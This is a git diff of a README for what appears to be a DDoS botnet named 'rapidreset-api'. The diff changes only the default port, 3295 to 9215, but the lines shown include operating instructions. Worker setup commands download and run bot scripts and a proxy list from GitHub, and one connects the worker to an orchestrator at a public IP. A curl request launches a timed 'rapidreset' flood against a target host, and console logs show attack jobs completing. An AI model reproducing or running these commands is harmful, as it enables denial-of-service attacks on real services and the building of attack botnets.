@@ -85,7 +85,7 @@ the broker. It needs `node` and `curl` only.
 
 | Variable | Default | Purpose |
 | --- | --- | --- |
-| `PORT` | `SERVER_PORT`, then `3295` | listening port |
+| `PORT` | `SERVER_PORT`, then `9215` | listening port |
 | `HOST` | `0.0.0.0` | listening interface |
 | `CLIENT_TOKEN` | empty | worker authentication; empty means any worker may connect |
 | `API_TOKEN` | empty | protects `/api/attack`, `/api/stop`, `/api/attack/:id`, `/api/workers` |
@@ -107,7 +107,7 @@ mkdir -p bot && cd bot \
   && curl -fsSLO https://raw.githubusercontent.com/malasahjagotwin/rapidreset-api/main/bot/rapidreset.js \
   && curl -fsSLO https://raw.githubusercontent.com/malasahjagotwin/rapidreset-api/main/bot/proxi.txt \
   && npm i hpack --no-audit --no-fund \
-  && ORCHESTRATOR=http://204.10.194.164:3295 node client.js
+  && ORCHESTRATOR=http://204.10.194.164:9215 node client.js
 ```
 
 Or:
@@ -115,12 +115,12 @@ Or:
 ```bash
 curl -fsSLO https://raw.githubusercontent.com/malasahjagotwin/rapidreset-api/main/start-bot.sh
 chmod +x start-bot.sh
-ORCHESTRATOR=http://10.0.0.5:3295 MAX_CONCURRENT=2 ./start-bot.sh worker-a
+ORCHESTRATOR=http://10.0.0.5:9215 MAX_CONCURRENT=2 ./start-bot.sh worker-a
 ```
 
 | Variable | Default | Purpose |
 | --- | --- | --- |
-| `ORCHESTRATOR` | `http://127.0.0.1:3295` | broker URL; `https://` is supported |
+| `ORCHESTRATOR` | `http://127.0.0.1:9215` | broker URL; `https://` is supported |
 | `CLIENT_TOKEN` | empty | must match the broker's `CLIENT_TOKEN` |
 | `WORKER_NAME` | hostname | display name; sanitized to `[A-Za-z0-9_-]` |
 | `MAX_CONCURRENT` | `1` | jobs this worker accepts at once (1–32) |
@@ -146,7 +146,7 @@ POST /api/attack        (JSON body: {"host":"...","time":30,"method":"..."})
 | `method` | yes | a name from `method.json` |
 
 ```bash
-curl "http://127.0.0.1:3295/api/attack?host=https://example.com&time=30&method=rapidreset"
+curl "http://127.0.0.1:9215/api/attack?host=https://example.com&time=30&method=rapidreset"
 ```
 
 ```json
@@ -200,7 +200,7 @@ up to `slots` concurrent jobs per worker.
 and `/api/workers`:
 
 ```bash
-curl -H "x-api-token: $API_TOKEN" "http://host:3295/api/attack?..."
+curl -H "x-api-token: $API_TOKEN" "http://host:9215/api/attack?..."
 # or
 curl -H "Authorization: Bearer $API_TOKEN" ...
 ```
@@ -248,8 +248,8 @@ Startup and runtime logs go through `src/ui/console.js`:
   ──────────────────────────────────────────────
   version     1.1.0
   node        v24.0.0
-  listen      0.0.0.0:3295
-  local       http://10.0.0.5:3295
+  listen      0.0.0.0:9215
+  local       http://10.0.0.5:9215
   methods     rapidreset
   token       worker + api
   ──────────────────────────────────────────────
@@ -258,7 +258,7 @@ Startup and runtime logs go through `src/ui/console.js`:
   › job        a1b2c3d4 → node-01-1234-ab12cd (control)  rapidreset example.com 30s
   ✓ job        a1b2c3d4 done  exit=0  31.2s
   ──────────────────────────────────────────────
-  ● listening on 0.0.0.0:3295 · ctrl+c to stop
+  ● listening on 0.0.0.0:9215 · ctrl+c to stop
 ```
 
 Warnings/errors go to stderr. `NO_COLOR`, `FORCE_COLOR`, `TERM=dumb`, and legacy Windows
